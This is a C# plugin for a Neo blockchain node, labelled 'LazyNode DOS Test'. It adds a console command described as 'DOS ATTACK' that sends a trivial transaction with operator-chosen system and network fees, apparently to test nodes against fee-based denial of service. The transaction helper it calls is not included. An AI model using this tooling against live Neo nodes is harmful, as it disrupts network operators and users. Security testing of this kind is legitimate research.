using Neo.SmartContract;
using Neo.Wallets;
using Neo.VM;
using Neo;
using Neo.ConsoleService;
using Neo.Plugins;
using System.Numerics;
using Neo.Ledger;
using Neo.Network.P2P.Payloads;
using Neo.SmartContract.Native;

namespace FeeDoS;
public class FeeDoS : Plugin
{
    public override string Name => "LazyNode DOS Test";
    private IWalletProvider? walletProvider;
    private static Neo.Wallets.Wallet? w;
    private NeoSystem? neoSystem;
    protected override void OnSystemLoaded(NeoSystem system)
    {
        neoSystem = system;
        neoSystem.ServiceAdded += NeoSystem_ServiceAdded;
    }
    private void NeoSystem_ServiceAdded(object? sender, object? service)
    {
        if (service is IWalletProvider)
        {
            walletProvider = service as IWalletProvider;
            neoSystem!.ServiceAdded -= NeoSystem_ServiceAdded;
            walletProvider!.WalletChanged += WalletProvider_WalletChanged;
        }
    }
    private void WalletProvider_WalletChanged(object? sender, Wallet? wallet)
    {
        walletProvider!.WalletChanged -= WalletProvider_WalletChanged;
        w = wallet;
    }

    [ConsoleCommand("a", Category = "LazyNode", Description = "DOS ATTACK")]
    private void OnAttack(uint sysfee, uint netfee)
    {
        var sb = new ScriptBuilder();
        sb.EmitPush(1337);
        Tx.MakeTx(sb.ToArray(), w!, neoSystem!, (long)sysfee*(long)100000000, (long)netfee*(long)100000000);
    }
    
}